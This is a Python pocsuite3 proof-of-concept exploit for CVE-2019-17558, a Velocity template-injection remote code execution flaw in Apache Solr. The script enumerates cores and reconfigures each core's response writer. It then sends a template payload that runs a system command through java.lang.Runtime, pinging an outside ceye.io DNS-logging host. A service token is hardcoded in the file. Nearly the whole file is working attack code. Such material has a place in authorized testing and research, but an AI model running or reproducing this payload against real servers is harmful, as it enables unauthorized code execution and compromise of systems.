#!/usr/bin/env python
#coding=utf-8

import random
import json
import time
import subprocess
import signal
import os
import sys
import base64
import re
from string import ascii_letters

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


'''
CVE-2019-17558
'''
class Solr_RCE_17558(POCBase):
    vulID = 'solr-CVE-2019-17558'
    appName = 'Solr'
    appVersion = '5.0.0 <= Apache Solr <= 8.3.1'
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.CODE_EXECUTION
    vulDate = '2019-10-30'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2019-10-31'  # 编写 PoC 的日期
    updateDate = '2020-05-21'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt']  # 漏洞地址来源,0day不用写
    name = 'Solr模板注入远程代码执行漏洞'  # PoC 名称
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危"

    
    # 使用随机字符串作为banner，通过ceye的接口判断命令是否被执行
    DOMAIN = 'wvg689.ceye.io'
    TOKEN = '76dce59a986eab595838f7dc74903035'
    BANNER = ''.join([random.choice(ascii_letters) for i in range(6)])
    CEYE_URL = 'http://api.ceye.io/v1/records?token={0}&type=dns&filter={1}'.format(TOKEN, BANNER)


    def _verify(self):
        result={}

        vul_url = self.url
        
        url_cores = vul_url + "/solr/admin/cores?wt=json"

        payload1_j = {
            "update-queryresponsewriter": {
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "params.resource.loader.enabled": "true"
            }
        }
        payload2 = "wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27ping%20{0}.{1}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end".format(self.BANNER, self.DOMAIN)

        core_names = self.get_core_names(url_cores)

        print(core_names)

        # 对每个core都发送一次请求
        for core_name in core_names:

            select_url = "/solr/" + core_name + "/select"
            
            config_url = "/solr/" + core_name + "/config"
    
            url1 = vul_url + config_url
            url2 = vul_url + select_url + "?" + payload2
            
            target_url = url1

            r1 = None
            r2 = None

            try:
                # 第一步，配置
                r1 = req.post(url1, json=payload1_j)
                if r1.status_code == 200:
                    # 第二步，利用
                    r2 = req.get(url2)
                # 返回400，可能这个core没有带VelocityResponseWriter，尝试下一个core
                elif r1.status_code == 400:
                    continue
            # 碰到异常进行下一个core的尝试
            except Exception as e:
                print(e)
                continue

            #time.sleep(2) # 休眠2s等待ceye生成记录
            #if self.test_dnslog(self.CEYE_URL):
            if self.test_verify(r2):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target_url
                result['VerifyInfo']['core'] = core_name
                result['VerifyInfo']['Payload1'] = payload1_j
                result['VerifyInfo']['Payload2'] = payload2
                return self.save_output(result)
        
        return self.save_output(result)


    ''' 拿到core的名字'''
    def get_core_name(self, p_url_cores):
        r = req.get(p_url_cores, verify=False, allow_redirects=False)
        
        if r.status_code == 200:
            if r.json()['status'] == "":    # 失败，退出
                self.save_output(result)
            else:
                a = list(r.json()['status'].keys())
        return a[0]


    ''' 拿到所有core的名字'''
    def get_core_names(self, p_url_cores):
        r = req.get(p_url_cores, verify=False, allow_redirects=False)
        
        if r.status_code == 200:
            if r.json()['status'] == "":    # 失败，退出
                self.save_output(result)
            else:
                a = list(r.json()['status'].keys())
        return a


    # 验证DNS已被解析，命令执行
    def test_dnslog(self, url):
        resp = req.get(url)
        d = resp.json()
        try:
            sub_domain = d['data'][0]['domain']
            if self.BANNER in sub_domain:
                return True
        except Exception:
            return False                 


    # 以响应中的`org.apache.velocity`作为命令成功执行的特征
    def test_verify(self, p_resp):
        if p_resp.status_code == 500 and "org.apache.velocity" in p_resp.text:
            return True
        return False


    # 攻击模块
    def _attack(self):
        return self._verify()

    # 输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


# 注册类
register_poc(Solr_RCE_17558)
